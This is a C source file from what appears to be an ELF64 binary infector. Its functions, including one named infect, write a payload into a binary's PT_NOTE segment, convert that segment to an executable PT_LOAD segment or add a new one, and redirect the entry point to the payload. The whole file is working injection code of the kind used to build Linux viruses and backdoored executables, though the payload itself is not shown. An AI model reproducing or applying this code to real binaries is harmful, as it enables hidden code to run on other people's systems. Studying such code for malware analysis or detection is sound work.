
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "elf64_patch.h"
#include "elf64_payload.h"
#include "types.h"
#include "retcodes.h"
#include "elf64_shr.h"
#include "elf64_phr.h"


void infect(ELF *bin, unsigned char *payload, Elf64_Off offset, Elf64_Half pl_size, 
		Elf64_Off nxtp_off, FILE *target) {
	size_t i;
	unsigned char byte;
	fseek(bin->file, 0L, SEEK_SET);
	for (i = 0; i < offset; i++) {
		fread(&byte, 1, 1, bin->file);
		fwrite(&byte, 1, 1, target);
	}
	for (i = 0; i < pl_size; i++) {
		fwrite(payload + i, 1, 1, target);
	}
	fseek(bin->file, nxtp_off, SEEK_SET);
	while (fread(&byte, 1, 1, bin->file) == 1)
		fwrite(&byte, 1, 1, target);
	/* Modify entry point */
	Elf64_write_ehr(target, bin->ehr);
	/* Modify section size */
	Elf64_write_shr_all(target, bin->shr, bin->ehr->e_shnum, bin->ehr->e_shoff, bin->ehr->e_shentsize);
	Elf64_write_phr_all(target, bin->phr, bin->ehr->e_phnum, bin->ehr->e_phoff, bin->ehr->e_phentsize);
	return;
}


// @req pnote->p_filesz >= *pl_size
void Elf64_patch_existing_segment(ELF *bin, Elf64_Phdr *phr, unsigned char *pl, Elf64_Half *pl_size, FILE *target) {
	// TODO if no pnote (ie NULL)
	pl = pad_payload(pl, pl_size, phr->p_filesz, 0x00);
	// TODO if no pcode (ie NULL)
	Elf64_Phdr *pcode = Elf64_get_pcode(bin);
	phr->p_type = PT_LOAD;
	phr->p_flags = pcode->p_flags;
	bin->ehr->e_entry = phr->p_vaddr;
	infect(bin, pl, phr->p_offset, *pl_size, phr->p_offset + phr->p_filesz,
		target);
	return;
}


Elf64_Phdr *Elf64_create_phr(Elf64_Word p_flags, Elf64_Addr addr_base, 
		Elf64_Xword p_align, Elf64_Off p_offset, Elf64_Half p_size) {
	Elf64_Phdr *phr = malloc(sizeof(Elf64_Phdr));
	phr->p_type = PT_LOAD;
	phr->p_flags = p_flags;
	phr->p_offset = p_offset;
	phr->p_filesz = p_size;
	phr->p_memsz = p_size;
	phr->p_paddr = addr_base + phr->p_offset;
	phr->p_vaddr = addr_base + phr->p_offset;
	phr->p_align = p_align;
	return phr;
}


void Elf64_patch_new_segment(ELF *bin, unsigned char *pl, Elf64_Half pl_size, 
		FILE *target) {
	Elf64_Half i;
	unsigned char byte;
	Elf64_Phdr *pcode = Elf64_get_pcode(bin);
	Elf64_Half pnote_idx = Elf64_get_phr_idx(bin, Elf64_get_pnote(bin));
	Elf64_Phdr *phr = Elf64_create_phr(pcode->p_flags, pcode->p_vaddr - pcode->p_offset, pcode->p_align, bin->size, pl_size);
	Elf64_replace_phr(bin, phr, pnote_idx);

	fseek(bin->file, 0L, SEEK_SET);
	while (fread(&byte, 1, 1, bin->file) == 1) {
		fwrite(&byte, 1, 1, target);
	}
	for (i = 0; i < pl_size; i++)
		fwrite(pl + i, 1, 1, target);
	/* Modify entry point */
	bin->ehr->e_entry = phr->p_vaddr;
	Elf64_write_ehr(target, bin->ehr);
	Elf64_write_phr_all(target, bin->phr, bin->ehr->e_phnum, bin->ehr->e_phoff, bin->ehr->e_phentsize);
}


void Elf64_patch_binary(ELF *bin, unsigned char *pl, Elf64_Half *pl_size, 
		char *out_fname) {
	/* TODO check name */
	FILE *target = fopen(out_fname, "w");
	/* Check if payload fits in note section */	
	Elf64_Phdr *pnote = Elf64_get_pnote(bin);
	if (pnote->p_filesz >= *pl_size)
		Elf64_patch_existing_segment(bin, pnote, pl, pl_size, target);
	else
		Elf64_patch_new_segment(bin, pl, *pl_size, target);
	fclose(target);
}
